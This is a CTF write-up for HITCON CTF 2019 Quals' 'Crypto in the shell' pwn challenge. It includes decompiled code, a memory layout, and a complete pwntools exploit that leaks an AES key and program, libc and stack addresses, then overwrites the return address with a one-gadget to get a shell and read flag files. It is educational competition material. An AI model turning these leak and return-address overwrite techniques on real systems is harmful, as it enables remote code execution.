---
layout: post
title: "HITCON CTF 2019 Quals: Pwn - Crypto in the shell"
modified: 2019-10-19
tags: hitconctf, hitconctf2019quals, pwn
---

This pwn challenge had a really short code, so it did not require too much reverse engineering efforts: it could encrypt the program's memory at any (relative) address and size with an unknown, but constant AES key and get the result of the encryption. This could be repeated at maximum of 32 times.

## The challenge

The main contains every functionality which needed for understanding the challenge:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int iRound; // [rsp+8h] [rbp-28h]
  __int64 offs; // [rsp+10h] [rbp-20h]
  size_t size; // [rsp+18h] [rbp-18h]
  void *buf; // [rsp+20h] [rbp-10h]
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  readkey(); // reads key.txt into AESkey (so the key is constant)
  for ( iRound = 0; iRound <= 31; ++iRound )
  {
    printf("offset:");
    if ( scanf("%llu", &offs) != 1 )
      break;
    printf("size:");
    if ( scanf("%llu", &size) != 1 )
      break;
    if ( size )
    {
      size = (size & 0xFFFFFFFFFFFFFFF0LL) + 16;
      buf = &g_buf[offs];
      AESencrypt(AESkey, &iv, &g_buf[offs], size);
      write(1, buf, size);
    }
  }
  return 0;
}
```

The `.data` and `.bss` looked like this:

```
.data:0000000000202000 __data_start    db 0, 0, 0, 0, 0, 0, 0, 0 ; Alternative name is '__data_start'
.data:0000000000202008 __dso_handle    dq offset __dso_handle  ; DATA XREF: __do_global_dtors_aux+17↑r
...
.bss:0000000000202340 __bss_start     dq ?  // == stdout
.bss:0000000000202350 stdin@@GLIBC_2_2_5 dq ?
.bss:0000000000202360 stderr@@GLIBC_2_2_5 dq ?
.bss:0000000000202380 AESkey          db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
.bss:0000000000202390 iv              db ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?
.bss:00000000002023A0 g_buf           db 140h dup(?)
```

## The solution

* First we encrypt the AES key itself and get the encryption's result (thus the new AES key).
* Now we can decrypt locally any encryption result we get back
* We encrypt and leak `__dso_handle`'s value (addr = `0x202008`), so we can calculate the program's base address
  * this is needed as we can only write relative to `g_buf` which is on `.bss`
* We encrypt and leak `stderr`'s value (addr = `0x202360`), so we can calculate the `libc`'s base address
* We leak a stack address from `libc`, so we know where is the `iRound` loop variable and where is the return address stored
* We encrypt the `iRound`'s value which is fortunately a signed value, so we now can overwrite unlimited memory addresses
* We brute-force the return address byte-by-byte (but without touching the canary) by blindly encrypting the return address's value until we get the address of a one-gadget RCE

## The exploit

```python
# -*- coding: utf-8 -*-
from pwn import *
from Crypto.Cipher import AES

REMOTE = True

if REMOTE:
    p = remote("3.113.219.89", 31337)
else:
    p = process("./chall", aslr=True)
    
def query(relAddr, size=15):
    p.sendline(str(relAddr - bufAddr))
    p.sendlineafter("size:", str(size))
    return p.recvuntil("offset:", drop=True)

def enc(key, data, iv="\0"*16):
    return AES.new(key, AES.MODE_CBC, iv).encrypt(data)

def dec(key, data, iv="\0"*16):
    return AES.new(key, AES.MODE_CBC, iv).decrypt(data)

bssLeakAddr   = 0x202008
stderrAddr    = 0x202360
bufAddr       = 0x2023A0
ivAddr        = 0x202390 
keyAddr       = 0x202380
# a98:54c0│   0x7ffff7dd44c0 (__libc_argv) —▸ 0x7fffffffe4d8 —▸ 0x7fffffffe71f ◂— '/home/kt/ctf/hitcon19/crypto/chall'
key = query(keyAddr)
print "key = %r" % key

def leak(addr):
    return u64(dec(key, query(addr))[0:8])

stderr = leak(stderrAddr)
libcBase = stderr - 0x155555327680 + 0x155554f3b000
stackLeakAddr = libcBase + 0x3f04c0 # 0x15555532b4c0, 0x7ffff7dd44c0
print "stderr = 0x%x, libcBase = 0x%x, stackLeakAddr = 0x%x" % (stderr, libcBase, stackLeakAddr)

bssLeak = leak(bssLeakAddr)
prgBase = bssLeak - 0x555555756008 + 0x555555554000
bufAddr += prgBase # leak now works on absolute addresses
print "bssLeak = 0x%x, prgBase = 0x%x" % (bssLeak, prgBase)

stackArgvLeak = leak(stackLeakAddr)
loopVarAddr = stackArgvLeak - 0x7fffffffe4d8 + 0x7fffffffe3c8
retAddrAddr = stackArgvLeak - 0x7fffffffe4d8 + 0x7fffffffe3f8
print "stackArgvLeak = 0x%x, loopVarAddr = 0x%x, retAddrAddr = 0x%x" % (stackArgvLeak, loopVarAddr, retAddrAddr)

newLoopVar = query(loopVarAddr - 4)
print "new loop var: %r == %d" % (newLoopVar, u32(newLoopVar[0:4], sign="signed"))

# 0x7ffff7a05b97   retAddr     -->
# 0x7ffff7a332c5   oneGadget

oneGadgetAddr = libcBase + 0x4f2c5

oneGadgetBytes = p64(oneGadgetAddr)
for iByte in xrange(0,8):
    print "BRUTEFORCING RET ADDR BYTE #%d" % iByte
    while True:
        newRetAddrBytes = query(retAddrAddr + iByte)[0:8-iByte] # 0x97, 0x5b, 0xa0
        print "  new return address: %s (expected: %s)" % (newRetAddrBytes.encode('hex'), oneGadgetBytes.encode('hex'))
        if newRetAddrBytes[0] == oneGadgetBytes[iByte]:
            print "   => WIN!!!"
            break

p.sendline("ls")
p.sendline("ls")
p.sendline("ls /")
p.sendline("cat flag*")
p.sendline("cat /flag*")
p.sendline("cat /home/*/flag*")
p.interactive()
```

## The flag

```
hitcon{is_tH15_A_crypTO_cha11eng3_too00oo0oo???}
```